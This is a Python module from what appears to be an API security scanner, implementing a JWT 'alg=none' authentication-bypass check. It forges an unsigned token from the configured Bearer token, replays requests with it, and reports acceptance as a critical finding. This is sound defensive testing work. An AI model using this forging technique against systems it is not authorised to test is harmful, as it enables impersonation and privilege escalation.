"""API2:2023 - Broken Authentication.

Implemented check: JWT `alg=none` bypass. If the scanner is configured with
a Bearer JWT, we strip its signature, set `alg: none`, and replay the
request. If the API still accepts it, it never verified the signature in
the first place — an attacker can forge arbitrary claims (different user
id, elevated role, ...) without knowing any secret.

This is a real, working check meant as the reference implementation for the
other checks in this package — see bola.py / mass_assignment.py /
excessive_data_exposure.py for the pattern to follow, including the same
`endpoint.security == []` guard used here: an endpoint the spec explicitly
declares needs no auth at all will trivially "accept" a forged token too
(it accepts ANY token, or none), which isn't a bypass of anything -- there
was no signature verification to bypass in the first place. Same false
positive class BOLA has to guard against, same fix.
"""

from __future__ import annotations

import base64
import json

import jwt
import requests

from apisec.checks.base import Finding, ScanContext, Severity
from apisec.spec_loader import Endpoint


def _b64url_no_pad(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_alg_none_token(original_token: str) -> str | None:
    try:
        payload = jwt.decode(original_token, options={"verify_signature": False})
    except jwt.PyJWTError:
        return None
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = _b64url_no_pad(json.dumps(header).encode())
    payload_b64 = _b64url_no_pad(json.dumps(payload).encode())
    return f"{header_b64}.{payload_b64}."


class BrokenAuthCheck:
    id = "API2:2023"
    title = "Broken Authentication - JWT alg=none bypass"

    def run(self, endpoint: Endpoint, ctx: ScanContext) -> list[Finding]:
        if endpoint.security == []:
            return []  # spec explicitly declares this endpoint needs no auth

        session = ctx.session_a
        auth_header = session.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return []  # no bearer token configured, nothing to forge

        original_token = auth_header.removeprefix("Bearer ")
        forged = _forge_alg_none_token(original_token)
        if forged is None:
            return []

        url = endpoint.url(ctx.base_url)
        forged_headers = {**session.headers, "Authorization": f"Bearer {forged}"}
        try:
            resp = session.request(endpoint.method, url, headers=forged_headers, timeout=5)
        except requests.RequestException:
            return []

        if resp.status_code < 400:
            return [
                Finding(
                    check_id=self.id,
                    title=self.title,
                    severity=Severity.CRITICAL,
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    description=(
                        "The API accepted a JWT with alg=none, meaning the signature was "
                        "never verified. An attacker can forge arbitrary claims (e.g. a "
                        "different user_id or an elevated role) without knowing any secret."
                    ),
                    evidence=f"Request accepted with status {resp.status_code} using a "
                    f"forged unsigned token: {forged[:60]}...",
                )
            ]
        return []
